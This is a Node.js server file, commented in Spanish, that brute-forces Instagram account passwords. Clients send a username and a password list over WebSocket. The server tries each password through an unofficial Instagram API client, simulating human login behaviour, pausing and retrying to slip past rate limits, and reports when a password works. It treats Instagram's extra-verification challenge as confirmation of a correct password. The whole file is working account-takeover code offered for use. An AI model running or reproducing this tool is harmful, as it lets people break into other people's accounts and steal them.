const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// Configuración mejorada
const CONFIG = {
  ACCESS_PASSWORD: process.env.ACCESS_PASSWORD || 'error404notfoundÑ',
  DELAY_BETWEEN_ATTEMPTS: 2500, // Aumentamos el delay para evitar bloqueos
  MAX_RETRIES: 2, // Intentos adicionales por contraseña
  PORT: process.env.PORT || 3000
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Función mejorada para verificar credenciales
async function verifyCredentials(username, password) {
  const ig = new IgApiClient();
  ig.state.generateDevice(username);
  
  try {
    // Simular comportamiento humano
    await ig.simulate.preLoginFlow();
    await delay(2000); // Delay más realista
    
    // Intentar login
    const auth = await ig.account.login(username, password);
    
    if (auth.status === 'ok') {
      return { success: true, password };
    }
  } catch (error) {
    console.log(`Intento fallido para ${password}:`, error.message);
    
    // Manejo especial de errores
    if (error.message.includes('challenge_required')) {
      return { 
        success: true, 
        password,
        message: '¡Contraseña correcta! Instagram requiere verificación adicional.'
      };
    }
    
    if (error.message.includes('password')) {
      return { success: false, message: 'Contraseña incorrecta' };
    }
    
    // Si es un error de límite, esperamos más tiempo
    if (error.message.includes('limit') || error.message.includes('blocked')) {
      await delay(15000); // 15 segundos de espera
      return verifyCredentials(username, password); // Reintentar
    }
  }
  
  return { success: false };
}

app.use(express.static('public'));

wss.on('connection', (ws) => {
  console.log('Nuevo cliente conectado');

  ws.on('message', async (message) => {
    try {
      const data = JSON.parse(message);
      
      // Verificación de acceso
      if (data.type === 'verifyAccessPassword') {
        const isValid = data.password === CONFIG.ACCESS_PASSWORD;
        ws.send(JSON.stringify({
          type: 'accessResponse',
          valid: isValid,
          message: isValid ? 'Acceso concedido' : 'Contraseña incorrecta'
        }));
        return;
      }
      
      // Proceso de fuerza bruta
      if (data.type === 'startLogin') {
        const { username, passwords } = data;
        
        for (let i = 0; i < passwords.length; i++) {
          const password = passwords[i];
          
          // Enviar progreso
          ws.send(JSON.stringify({
            type: 'progress',
            current: i + 1,
            total: passwords.length,
            trying: password
          }));
          
          // Intentar con retry
          let result;
          for (let retry = 0; retry < CONFIG.MAX_RETRIES; retry++) {
            result = await verifyCredentials(username, password);
            if (result.success || retry === CONFIG.MAX_RETRIES - 1) break;
            await delay(CONFIG.DELAY_BETWEEN_ATTEMPTS);
          }
          
          if (result.success) {
            return ws.send(JSON.stringify({
              type: 'success',
              password: result.password,
              message: result.message || '¡Contraseña correcta encontrada!'
            }));
          }
          
          await delay(CONFIG.DELAY_BETWEEN_ATTEMPTS);
        }
        
        ws.send(JSON.stringify({
          type: 'completed',
          success: false,
          message: 'No se encontró la contraseña correcta'
        }));
      }
    } catch (error) {
      console.error('Error:', error);
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Error en el servidor'
      }));
    }
  });
});

server.listen(CONFIG.PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${CONFIG.PORT}`);
});
